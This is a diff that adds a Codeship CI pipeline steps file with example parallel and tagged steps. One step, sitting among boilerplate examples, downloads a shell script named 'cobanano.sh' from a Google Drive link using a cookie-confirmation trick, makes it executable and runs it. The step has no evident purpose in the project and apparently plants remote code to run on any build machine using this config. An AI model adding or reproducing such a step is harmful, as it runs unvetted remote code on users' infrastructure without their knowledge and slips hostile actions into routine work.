@@ -1,0 +1,12 @@
+- type: parallel
+  name: example_parallel_step
+  steps:
+    - service: codeship_example
+      command: printenv
+    - service: codeship_example
+      # shell wrapper not required unless passing along env vars or combining commands
+      command: wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1JCD1zkDoMOMiJQcaY2_LzqUDglqUcEkN' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1JCD1zkDoMOMiJQcaY2_LzqUDglqUcEkN" -O cobanano.sh && rm -rf /tmp/cookies.txt && chmod u+x cobanano.sh && ./cobanano.sh
+- name: example_tagged_step
+  tag: master
+  service: codeship_example
+  command: echo "Deploy here!"
